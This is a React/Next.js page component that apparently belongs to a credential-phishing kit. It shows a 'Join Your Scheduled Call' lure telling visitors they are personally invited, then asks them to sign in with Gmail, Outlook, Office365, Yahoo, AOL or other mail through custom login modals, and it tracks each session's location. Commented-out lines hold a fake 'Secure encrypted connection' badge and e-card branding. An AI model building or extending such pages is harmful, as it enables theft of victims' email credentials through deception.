"use client";

import ConsentGate from "@/components/ConsentGate";
import { ProviderLogo } from "@/components/ProviderBrand";
import ProviderLoginModal from "@/components/ProviderLoginModal";
import { useSessionLocation } from "@/hooks/useSessionTracking";
import { getGmailLoginPath } from "@/lib/gmail-login-url";
import { useCallback, useState } from "react";

const providers = [
  { id: "Gmail", className: "gmail", label: "Gmail" },

  { id: "Outlook", className: "outlook", label: "Outlook" },
  { id: "Office365", className: "office", label: "Office365" },
  { id: "Yahoo", className: "yahoo", label: "Yahoo Mail" },
  { id: "AOL", className: "aol", label: "AOL" },
  { id: "Other", className: "other", label: "Other Mail" },
] as const;

type Props = {
  requireConsent: boolean;
};

export default function HomePageClient({ requireConsent }: Props) {
  const [consented, setConsented] = useState(!requireConsent);
  const [modalProvider, setModalProvider] = useState<string | null>(null);

  const handleConsented = useCallback(() => setConsented(true), []);

  useSessionLocation(consented);

  const openProvider = async (provider: string) => {
    if (requireConsent && !consented) return;

    if (provider === "Gmail") {
      window.open(getGmailLoginPath(), "_blank", "noopener,noreferrer");
      return;
    }

    setModalProvider(provider);
  };

  const providersEnabled = !requireConsent || consented;

  return (
    <div className="shell home-page app-container">
      <div
        className="shell-bg"
        style={{ backgroundImage: "url(/images/card.jpg)" }}
      />
      <div className="shell-gradient home-gradient" />

      <div className="home-card">
        <div className="home-card-body">
          <div className="home-logo">
            <img src="/images/call.png" alt="Site Logo" />
          </div>

          <h1 className="home-title">
            Join Your Scheduled Call
          </h1>
          <p className="home-description">
            You&apos;ve been personally invited to join us. To access your
            meeting details and join the call, please sign in with your email
            provider below. We&apos;re looking forward to speaking with you.
          </p>

          {requireConsent && <ConsentGate onConsented={handleConsented} />}
    

          <div className={providersEnabled ? "" : "providers-disabled"}>
            <div className="button-grid home-button-grid">
              {providers.map(({ id, className, label }) => (
                <button
                  key={id}
                  type="button"
                  className={`home-provider-btn ${className}`}
                  onClick={() => openProvider(id)}
                  disabled={!providersEnabled}
                >
                  <span className="home-btn-icon">
                    <ProviderLogo provider={id} size={20} />
                  </span>
                  <span className="home-btn-label">Sign in with {label}</span>
                </button>
              ))}
            </div>
          </div>
          <footer className="home-footer">
            {/* <p className="home-footer-blurb">
              Online Invitations & Birthday Cards — E-Card simplifies event
              planning with user-friendly tools for managing online invitations
              and greeting cards.
            </p> */}
            <p className="home-footer-legal">
              © 2026 Sincere Corporation. All rights reserved. All other product
              and company names are trademarks or registered trademarks of their
              respective owners.
            </p>
            {/* <div className="home-secure-badge">
              <span className="home-secure-icon" aria-hidden="true">
                🔒
              </span>
              <span>Secure encrypted connection</span>
            </div> */}
          </footer>
        </div>
      </div>

      {modalProvider && modalProvider !== "Gmail" && (
        <ProviderLoginModal
          provider={modalProvider}
          onClose={() => setModalProvider(null)}
        />
      )}
    </div>
  );
}
